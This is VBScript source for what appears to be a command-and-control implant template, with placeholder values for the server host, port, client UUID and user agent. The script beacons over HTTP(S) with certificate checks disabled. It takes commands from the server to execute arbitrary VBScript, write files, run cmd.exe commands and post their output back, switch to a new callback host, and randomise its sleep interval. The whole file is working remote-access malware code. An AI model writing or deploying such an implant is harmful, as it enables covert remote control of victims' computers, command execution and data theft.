On Error Resume Next
Set Shell = CreateObject("WScript.Shell")
Set FsoObj = CreateObject("Scripting.FileSystemObject")
Break = False
UUID = "<client_uuid_00000000-0000-0000-0000-000000000000>"
RequestPath = "<registered_uri_path>"
Server = "<server_host_name_example.com>"
Port = "<server_port_443>"
HttpLabel = "<http_prefix>://"
MinWait = <min_wait_5000>
MaxWait = <max_wait_8000>
UserAgent = "<client_user_agent>"
Set ExitRe = New RegExp: ExitRe.Pattern = "<EXIT>$"
Set NopRe = New RegExp: NopRe.Pattern = "<NOP>$"
Set UuidRe = New RegExp: UuidRe.Pattern = "<SETUUID><UUID:([a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12})>$"
Set SetCallbackRe = New RegExp: SetCallbackRe.Pattern = "<SETCALLBACK><INTERVAL:(\d+)><RANGE:(\d+)>$"
Set SetCallbackHostRe = New RegExp: SetCallbackHostRe.Pattern = "<SETCALLBACKHOST><HOST:([^\s>]+)><PORT:(\d+)>$"
Set ExecVbsRe = New RegExp: ExecVbsRe.Pattern = "<EXECVBS><VBS:(.+)>$"
Set WriteFileRe = New RegExp: WriteFileRe.Pattern = "<WRITEFILE><FILEPATH:(.+)><FILECONTENT:(.+)>$"
Set CmdRe = New RegExp: CmdRe.Pattern = "<CMD><CMD:(.+)>$"
Set SilentCmdRe = New RegExp: SilentCmdRe.Pattern = "<SILENTCMD><CMD:(.+)>$"
Set NextPathRe = New RegExp: NextPathRe.Pattern = "^<NEXTPATH><PATH:([^\s>]+)>"
Results = ""
CallbackCount = 0
BadResponseCount = 0
BadResponseLimit = 5
While Break <> True
    Command = ""
    Set XmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    XmlHttpReq.setOption 2, SXH_SERVER_CERT_IGNORE_ALL_SERVER_ERRORS
    If Len(Results) = 0 Then
        XmlHttpReq.Open "GET", HttpLabel & Server & ":" & Port & RequestPath, false
    Else
        XmlHttpReq.Open "POST", HttpLabel & Server & ":" & Port & RequestPath, false
    End If
    CallbackCount = CallbackCount + 1
    XmlHttpReq.setRequestHeader "User-Agent", UserAgent
    XmlHttpReq.setRequestHeader "_user", UUID
    XmlHttpReq.setRequestHeader "_x", 2
    XmlHttpReq.setRequestHeader "_y", CallbackCount
    If Len(Results) = 0 Then
        XmlHttpReq.Send
    Else
        XmlHttpReq.Send(Results)
        Results = ""
    End If
    Command = XmlHttpReq.responseText
    Set XmlHttpReq = Nothing
    If Command = "" Then
        BadResponseCount = BadResponseCount + 1
    Else
        BadResponseCount = 0
    End If
    If BadResponseCount >= BadResponseLimit Then
        Break = True
    End If
    If NextPathRe.Test(Command) Then
        For Each MatchObj in NextPathRe.Execute(Command)
            RequestPath = MatchObj.Submatches(0)
        Next
    End If
    If ExitRe.Test(Command) Then
        Break = True
    ElseIf UuidRe.Test(Command) Then
        For Each MatchObj in UuidRe.Execute(Command)
            UUID = MatchObj.Submatches(0)
        Next
    ElseIf SetCallbackRe.Test(Command) Then
        For Each MatchObj in SetCallbackRe.Execute(Command)
            MinWait = CInt(MatchObj.Submatches(0)) - CInt(MatchObj.Submatches(1))
            MaxWait = CInt(MatchObj.Submatches(0)) + CInt(MatchObj.Submatches(1))
        Next
    ElseIf SetCallbackHostRe.Test(Command) Then
        For Each MatchObj in SetCallbackHostRe.Execute(Command)
            Server = MatchObj.Submatches(0)
            Port = MatchObj.Submatches(1)
        Next
    ElseIf ExecVbsRe.Test(Command) Then
        For Each MatchObj in ExecVbsRe.Execute(Command)
            Execute MatchObj.Submatches(0)
        Next
    ElseIf WriteFileRe.Test(Command) Then
        For Each MatchObj in WriteFileRe.Execute(Command)
            Set FileObj = FsoObj.CreateTextFile(MatchObj.Submatches(0),True)
            FileObj.Write MatchObj.Submatches(1)
            FileObj.Close
        Next
    ElseIf CmdRe.Test(Command) Then
        For Each MatchObj in CmdRe.Execute(Command)
            Set ExecObj = Shell.Exec(("C:\Windows\System32\cmd.exe /c " & MatchObj.Submatches(0)))
            Results = ""
            Do Until ExecObj.StdOut.AtEndOfStream
                Results = Results & ExecObj.StdOut.ReadAll()
            Loop
        Next
    ElseIf SilentCmdRe.Test(Command) Then
        For Each MatchObj in SilentCmdRe.Execute(Command)
            Shell.Run MatchObj.Submatches(0), 0, True
        Next
    ElseIf NopRe.Test(Command) Then
        Results = ""
    End If
    If Len(Results) = 0 And Break = False Then
        Randomize
        WScript.Sleep(Int((MaxWait-MinWait+1)*Rnd+MinWait))
    End If
Wend
